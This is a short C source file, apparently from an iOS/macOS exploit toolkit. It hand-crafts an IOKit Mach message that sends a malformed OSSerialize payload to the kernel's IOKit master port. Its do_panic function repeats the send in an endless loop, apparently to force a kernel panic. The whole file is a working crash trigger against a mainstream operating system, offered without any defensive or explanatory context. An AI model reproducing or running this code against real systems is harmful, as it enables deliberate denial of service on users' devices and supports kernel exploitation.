#include <mach/mach.h>

#include "iokit.h"

#include "panic.h"

static void get_matching_services_ool(mach_port_t master_port, void *matching, mach_msg_type_number_t matchingCnt)
{
#ifdef  __MigPackStructs
#pragma pack(4)
#endif
    typedef struct {
        mach_msg_header_t Head;
        /* start of the kernel processed data */
        mach_msg_body_t msgh_body;
        mach_msg_ool_descriptor_t matching;
        /* end of the kernel processed data */
        NDR_record_t NDR;
        mach_msg_type_number_t matchingCnt;
    } Request;
    typedef struct {
        mach_msg_header_t Head;
        /* start of the kernel processed data */
        mach_msg_body_t msgh_body;
        mach_msg_port_descriptor_t existing;
        /* end of the kernel processed data */
        NDR_record_t NDR;
        kern_return_t result;
        mach_msg_trailer_t trailer;
    } Reply;
#pragma pack()

    union {
        Request In;
        Reply Out;
    } Mess;

    Request *InP = &Mess.In;

    InP->msgh_body.msgh_descriptor_count = 1;
    InP->matching.address = (void *)(matching);
    InP->matching.size = matchingCnt;
    InP->matching.deallocate =  FALSE;
    InP->matching.copy = MACH_MSG_PHYSICAL_COPY;
    InP->matching.type = MACH_MSG_OOL_DESCRIPTOR;
    InP->NDR = NDR_record;
    InP->matchingCnt = matchingCnt;
    InP->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    InP->Head.msgh_remote_port = master_port;
    InP->Head.msgh_local_port = mig_get_reply_port();
    InP->Head.msgh_id = 2857;
    InP->Head.msgh_reserved = 0;

    mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
}

__attribute__((noreturn)) void do_panic(void)
{
    mach_port_t master = MACH_PORT_NULL;
    host_get_io_master(mach_host_self(), &master);
    while(1)
    {
        uint32_t payload[] =
        {
            kOSSerializeMagic,
            kOSSerializeEndCollection | kOSSerializeArray | 0x400,
            kOSSerializeEndCollection | kOSSerializeObject | 0,
        };
        get_matching_services_ool(master, payload, sizeof(payload));
    }
}
